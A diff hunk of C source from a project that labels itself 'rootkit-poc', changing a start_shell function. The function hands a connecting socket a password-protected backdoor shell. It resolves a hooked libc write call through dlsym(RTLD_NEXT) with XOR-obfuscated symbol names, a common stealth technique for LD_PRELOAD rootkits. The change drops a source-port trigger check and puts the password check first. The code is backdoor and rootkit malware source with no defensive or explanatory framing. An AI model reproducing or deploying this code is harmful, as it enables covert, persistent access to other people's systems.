@@ -171,22 +171,20 @@ int start_shell(int sock, struct sockaddr *addr) {
         return -1;
     }
 
-    struct sockaddr_in *sa_i = (struct sockaddr_in *)addr; // converts the address to sockaddr_in
-
-    if (htons(sa_i->sin_port) >= SRC_LOW_PORT && htons(sa_i->sin_port) <= SRC_HIGH_PORT) {
-        char *sys_write = strdup(SYS_WRITE);
-        xor(sys_write);
-        s_write = dlsym(RTLD_NEXT, sys_write);
-        cleanup(sys_write, strlen(sys_write));
-    } else {
-        return sock;
-    }
-
     if (!check_shell_password(sock)) {
+        DEBUG("[rootkit-poc]: Invalid shell password\n");
         shutdown(sock, SHUT_RDWR);
         close(sock);
         return -1;
     }
+
+    char *sys_write = strdup(SYS_WRITE);
+
+    xor(sys_write);
+
+    s_write = dlsym(RTLD_NEXT, sys_write);
+
+    cleanup(sys_write, strlen(sys_write));
 
     DEBUG("[rootkit-poc]: Sending shell message to client\n");
     if (write(sock, shell_msg, strlen(shell_msg)) == -1) {
